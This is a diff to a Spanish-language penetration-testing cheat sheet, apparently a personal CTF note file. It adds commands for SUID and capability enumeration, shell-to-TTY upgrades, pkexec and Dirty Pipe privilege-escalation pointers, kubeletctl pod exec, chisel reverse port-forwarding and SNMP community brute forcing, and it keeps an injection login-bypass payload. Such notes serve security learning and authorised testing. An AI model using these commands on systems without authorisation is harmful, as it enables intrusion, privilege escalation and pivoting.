@@ -4,7 +4,7 @@
 ## Linux Commands
 
 ### FIND
-* Listar los permisos SUID: ``` find  \-perm -4000 2>/dev/null ```
+* Listar los permisos SUID, debe estar en la carpeta raiz del SO: ``` find  \-perm -4000 2>/dev/null ```
 
 ### Sistema Operativo
 * Conocer la IP de la máquina ``` hostname -I ```
@@ -14,6 +14,11 @@
 * Permite ver la descripción del sistema operativo ``` lsb_release -a ```
 * Permite ver la versión del kernel ``` uname -a ```
 * Permite ajustar el número de filas y columnas de la tty ``` stty rows <ROW_NUMBER> columns <COLUMN_NUMBER> ```
+* Permite convertir hexadecimal a texto ```echo "<HEX>" | xargs | xxd -ps -r ```
+* En el caso de no tener una bash interactiva se puede realizar el siguiente proceso 
+``` script /dev/null -c bash``` o ``` python3 -c 'import pty;pty.spawn("/bin/bash")' ``` luego se debe hacer un **CTRL_Z**
+ingresamos ``` stty raw -echo; fg ``` y por último ingresas ``` reset xterm ``` y consigues una shell interactiva en la máquina.
+* Buscar las capabilities ``` getcap -r / 2>/dev/null ```
 
 ### Python
 * Crear un servidor de python en mi máquina local ``` python3 -m http.server <PORT> ```
@@ -30,7 +35,18 @@ Y luego usar alguno de los siguientes comandos
 
 
 ## Privilege Escalation
+
+### Docker Escape
 * [Docker Socket Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape)
+
+### Pkexec
+Se comprueba si existe pkexec instalado y si tiene permisos SUID
+> which pkexec | xargs ls -l
+
+### Dirty Pipe
+Se debe tener GCC instalado en la máquina a atacar
+* [Dirty Pipe](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)
+
 
 
 ## Information Disclose
@@ -78,23 +94,35 @@ Lista información de las columnas
 > admin'||''==='
 
 
-## Chisel
+## Tools
+
+### Kubernetes
+#### Kubeletctl
+* ``` kubeletctl exec -s <SERVER_IP>  -p <POD_NAME> -c <CONTAINER_NAME> -i "bash" ```
+
+### Chisel
 Chisel se usa para realizar acciones como **LOCAL o REMOTE PORT-FORWARD**
 
 Dejar abierta una conexión como Server
 ```
-./chisel server --revers -p <PORT>
+./chisel server --reverse -p <PORT>
 ```
 Abrir una conexión como Client al Server, para este caso asiendo **Remote Port-Forward**
 ```
-./chisel client <IP_REMOTE>:<PORT> R:<PORT_LOCAL>:<IP_LOCAL>:<PORT_REMOTE>
+./chisel client <CHISEL_SERVER_IP>:<CHISEL_SERVER_PORT> R:<LOCAL_PORT>:<LOCAL_IP>:<LOCAL_PORT>
 ```
 
-
-## Tools
-
-### Kubernetes
-#### kubeletctl
-* ``` kubeletctl exec -s <SERVER_IP>  -p <POD_NAME> -c <CONTAINER_NAME> -i "bash" ```
-
-
+### SNMP
+#### Onesixtyone
+Onesixtyone permite hacer fuerza bruta para conocer las community en un servicio snmp
+```
+onesixtyone <REMOTE_IP> -c <DICTIONARY_PATH>
+```
+### Snmpwalk
+```
+snmpwalk -c <COMMUNITY> -v<SNMP_VERSION> <REMOTE_IP> <SEARCH_PATH>
+```
+Ejemplo, consideremos que el caracter **|** indica que podemos utilizar una de esas
+```
+snmpwalk -c public|private|etc -v1|2c|3 1.1.1.1 1|2
+```
